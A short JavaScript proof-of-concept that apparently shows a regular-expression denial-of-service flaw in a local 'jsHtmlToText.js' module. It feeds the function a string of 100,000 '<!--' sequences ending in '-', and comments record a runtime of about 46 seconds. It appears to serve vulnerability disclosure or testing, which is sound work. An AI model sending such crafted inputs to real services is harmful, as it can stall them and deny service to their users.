const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"<!--"*100000+"-"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<!--";
}
str += "-";

var result = htmlToText(str, "");

// real    0m45.836s
// user    0m45.797s
// sys     0m0.010s
